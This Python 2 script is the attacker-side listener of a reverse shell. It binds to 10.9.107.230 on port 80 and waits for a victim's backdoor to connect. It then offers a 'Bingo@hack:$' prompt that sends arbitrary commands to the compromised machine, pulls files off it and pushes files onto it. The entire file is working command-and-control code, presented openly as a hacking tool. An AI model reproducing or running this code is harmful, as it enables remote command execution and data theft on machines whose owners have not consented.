#!/usr/bin/env python

print("PYTHON2")
import socket
import json
import base64

class Listener:

    def __init__(self, your_ip, port):
        self.ip = your_ip
        self.port = port

        # Main Socket
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((self.ip, self.port))
        # backlog -- is how many connection to accept is the number of clients go up this will refuse to connect with the clients
        listener.listen(0)
        print('\n[+] Waiting For Connection [+]')

        self.connection, self.address = listener.accept()
        print('[+] Got A Connection From: ' + str(self.address) + ' [+]\n')

        # setsockopt is used to change any option in the socket object(listener)
        # enabling/changing the value of  SO_REUSEADDR will used if our connection gets dropped we can reuse our listener to connect again
        # 1 = enable


    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)


    def reliable_receive(self):
        json_data = ''
        while True:
            json_data += self.connection.recv(1024)
            try:
                return json.loads(json_data)
            except ValueError:
                continue


    def read_files(self, path):
        try:
            with open(path, 'rb') as file:
                return base64.b64encode(file.read())
        except IOError:
            return '0'

    def write_files(self, path, message):
        with open(path, 'wb') as file:
            file.write(base64.b64decode(message))


    def send_command(self, command):
        try:
            if command[0] == 'download' and len(command) > 1:
                self.reliable_send(command)
                data_to_write = self.reliable_receive()
                if data_to_write == '0':
                    return "[-] File Not Found (-_-) [-]"

                file_name = ''
                for i in command:
                    if i != 'download':  # ----------------------
                        file_name += i
                        file_name += ' '

                file_name = file_name[0:len(file_name) - 1]

                self.write_files(file_name, data_to_write)
                return "[+] File Downloaded Successfully [+]"

            elif command[0] == 'upload' and len(command) > 1:
                send_list = []
                send_list.append(command[0]) # Upload

                file_name = ''
                for i in command:
                    if i != 'upload': # ----------------------
                        file_name += i
                        file_name += ' '

                file_name = file_name[0:len(file_name) - 1]

                send_list.append(str(file_name)) # file Name

                sending_data = self.read_files(file_name)
                if sending_data == '0':
                    return '[-] File Not Found (-_-) [-]'
                else:
                    send_list.append(sending_data) # Upload
                    self.reliable_send(send_list)
                    return self.reliable_receive()

            elif command[0] == 'exit':
                self.reliable_send(command)
                self.connection.close()
                exit('\n[+] Have a Good Day! [+]')

            else:
                self.reliable_send(command)
                return self.reliable_receive()
        except Exception:
            return "[?] Unkown Error (*_*?) [?]"


    def run(self):
        while True:
            cmd = raw_input('Bingo@hack:$ ')
            cmd = cmd.split(' ')
            result = self.send_command(cmd)
            print('\n' + result + '\n')


rlistener = Listener('10.9.107.230', 80)
rlistener.run()
